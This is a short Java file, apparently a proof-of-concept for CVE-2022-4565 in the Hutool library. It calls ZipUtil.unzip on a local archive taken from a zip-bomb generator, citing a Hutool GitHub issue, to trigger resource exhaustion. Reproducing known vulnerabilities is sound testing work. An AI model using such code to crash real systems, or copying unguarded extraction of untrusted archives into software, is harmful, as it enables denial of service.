package hutool;

import cn.hutool.core.util.ZipUtil;

/**
 * reference：https://github.com/dromara/hutool/issues/2797
 */
public class CVE_2022_4565 {
    public static void main(String[] args) {
        ZipUtil.unzip("D:/download/zipbomb-generator-master/tgao.zip",
                "D:/download/zipbomb-generator-master/tgao");
    }
}